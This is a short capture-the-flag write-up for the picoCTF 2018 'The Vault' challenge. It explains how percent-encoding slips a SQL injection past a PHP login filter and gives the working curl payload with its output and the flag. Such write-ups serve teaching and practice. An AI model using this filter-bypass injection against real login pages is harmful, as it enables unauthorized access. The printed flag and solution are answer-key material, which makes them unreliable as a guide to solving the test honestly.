# The Vault
**Category:** Web Exploitation
> There is a website running at `http://2018shell1.picoctf.com:64349`
> ([link](http://2018shell1.picoctf.com:64349/)). Try to see if you can login!

The source code is provided, but you may be able to solve this even without
access. The gist of it is that the server uses some simple filtering rules to
detect injection attempts, so we need to find a way to perform SQL injection
while bypassing the filtering.

One common tactic is to use percent-encoding, which will automatically be
decoded on the server side but obviously will not be matched against the simple
character match rules in PHP.

	$ curl http://2018shell1.picoctf.com:64349/login.php -d 'username=admin%27%20--%20&password=sadf&debug=0'
	<h1>Logged in!</h1><p>Your flag is: picoCTF{w3lc0m3_t0_th3_vau1t_e4ca2258}</p>

flag: `picoCTF{w3lc0m3_t0_th3_vau1t_e4ca2258}`
